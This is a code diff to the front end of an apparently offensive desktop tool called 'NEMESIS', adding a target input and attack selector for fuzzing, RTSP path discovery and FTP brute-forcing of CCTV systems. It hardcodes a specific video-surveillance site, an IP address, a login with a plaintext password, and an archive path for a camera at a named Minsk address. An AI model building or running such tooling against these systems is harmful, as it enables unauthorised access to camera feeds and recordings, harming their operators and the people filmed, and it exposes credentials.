@@ -126,6 +126,8 @@ export default function App() {
   const [fuzzLogin, setFuzzLogin] = useState("mvd");
   const [fuzzPassword, setFuzzPassword] = useState("gpfZrw%9RVqp");
   const [fuzzPath, setFuzzPath] = useState("video0/[Minsk_ul._FILIMONOVA_39_]/2026-02-19/cam02_00-03-10.mkv");
+  const [targetInput, setTargetInput] = useState('https://videodvor.by/stream/');
+  const [attackType, setAttackType] = useState('generic');
   const [fuzzResults, setFuzzResults] = useState([]);
 
   const [shodanResults, setShodanResults] = useState([]);
@@ -642,16 +644,57 @@ export default function App() {
     }
   };
 
-  // --- ВОЗВРАЩАЕМ ПРОПАВШИЙ FUZZER ---
-  const handleNemesisFuzz = async () => {
-    if (!fuzzPassword) return alert("Нужен пароль для авторизации!");
+  // --- NEMESIS: универсальный запуск по введенной цели и выбранному протоколу ---
+  const handleStartNemesis = async () => {
+    const target = String(targetInput || '').trim();
+    if (!target) return alert('Введите IP или URL цели.');
+
     setLoading(true);
-    setRadarStatus('ЗАПУСК ПРОТОКОЛА NEMESIS (FUZZING)...');
+    setFuzzResults([]);
+    setRadarStatus(`ЗАПУСК ПРОТОКОЛА NEMESIS (${attackType})...`);
+
     try {
-      const adminHash = await invoke('nemesis_auto_login', { username: fuzzLogin, password: fuzzPassword });
-      const getResults = await invoke('nemesis_fuzz_archive_endpoint', { adminHash, targetFtpPath: fuzzPath });
-      const postResults = await invoke('nemesis_fuzz_post_endpoints', { adminHash, targetFtpPath: fuzzPath });
-      setFuzzResults([...getResults, ...postResults]);
+      if (attackType === 'generic') {
+        const report = await invoke('spider_full_scan', {
+          targetUrl: target,
+          cookie: hubConfig.cookie,
+          maxDepth: spiderMaxDepth,
+          maxPages: spiderMaxPages,
+          dirBruteforce: spiderDirBrute,
+          enableVulnVerification: spiderEnableVulnVerification,
+          enableOsintImport: spiderEnableOsintImport,
+          enableTopologyDiscovery: spiderEnableTopologyDiscovery,
+          enableSnapshotRefresh: spiderEnableSnapshotRefresh,
+          enableVideoStreamAnalyzer: spiderEnableVideoStreamAnalyzer,
+          enableCredentialDepthAudit: spiderEnableCredentialDepthAudit,
+          enablePassiveArpDiscovery: spiderEnablePassiveArpDiscovery,
+          enableUptimeMonitoring: spiderEnableUptimeMonitoring,
+          enableNeighborDiscovery: spiderEnableNeighborDiscovery,
+          enableThreatIntel: spiderEnableThreatIntel,
+          enableScheduledAudits: spiderEnableScheduledAudits,
+        });
+        setSpiderReport(report);
+        const apiRows = Array.isArray(report?.apiFuzzResults) ? report.apiFuzzResults : [];
+        setFuzzResults(apiRows.map((row) => {
+          const code = Number.isFinite(Number(row?.statusCode)) ? ` [${row.statusCode}]` : '';
+          return `${row?.protocol || 'GENERIC'}${code} ${row?.endpoint || ''} ${row?.verdict || ''}`.trim();
+        }));
+      } else {
+        const attackMap = {
+          tdkcgi: 'tdkcgi',
+          rtsp: 'rtsp',
+          ftp: 'ftp',
+        };
+        const results = await invoke('fuzz_cctv_api', {
+          targetInput: target,
+          attackType: attackMap[attackType] || 'generic',
+        });
+        const rows = Array.isArray(results) ? results : [];
+        setFuzzResults(rows.map((row) => {
+          const code = Number.isFinite(Number(row?.statusCode)) ? ` [${row.statusCode}]` : '';
+          return `${row?.protocol || attackType.toUpperCase()}${code} ${row?.endpoint || ''} ${row?.verdict || ''}`.trim();
+        }));
+      }
     } catch (err) {
       alert(`Ошибка Fuzzer: ${err}`);
     } finally {
@@ -1607,6 +1650,25 @@ const handleSecurityAudit = async () => {
           <div style={{ display: 'flex', gap: '6px', marginBottom: '6px' }}>
             <input
               style={{ flex: 1, backgroundColor: '#000', border: '1px solid #ffaa00', color: '#ffaa00', padding: '6px', boxSizing: 'border-box' }}
+              placeholder="Введите IP или URL цели (напр. 93.125.2.167:2019)"
+              value={targetInput}
+              onChange={e => setTargetInput(e.target.value)}
+            />
+            <select
+              style={{ width: '240px', backgroundColor: '#000', border: '1px solid #ffaa00', color: '#ffaa00', padding: '6px', boxSizing: 'border-box' }}
+              value={attackType}
+              onChange={e => setAttackType(e.target.value)}
+            >
+              <option value="generic">Generic API Fuzzer</option>
+              <option value="tdkcgi">TDKCGI (TVT/XM)</option>
+              <option value="rtsp">RTSP Path Discovery</option>
+              <option value="ftp">FTP Brute</option>
+            </select>
+          </div>
+
+          <div style={{ display: 'flex', gap: '6px', marginBottom: '6px' }}>
+            <input
+              style={{ flex: 1, backgroundColor: '#000', border: '1px solid #ffaa00', color: '#ffaa00', padding: '6px', boxSizing: 'border-box' }}
               placeholder="Логин (mvd)"
               value={fuzzLogin}
               onChange={e => setFuzzLogin(e.target.value)}
@@ -1628,7 +1690,7 @@ const handleSecurityAudit = async () => {
           />
 
           <button
-            onClick={handleNemesisFuzz}
+            onClick={handleStartNemesis}
             style={{ width: '100%', backgroundColor: '#ffaa00', color: '#000', border: 'none', padding: '8px', cursor: 'pointer', fontWeight: 'bold', letterSpacing: '1px' }}>
             ☢ ЗАПУСТИТЬ ПРОТОКОЛ NEMESIS
           </button>
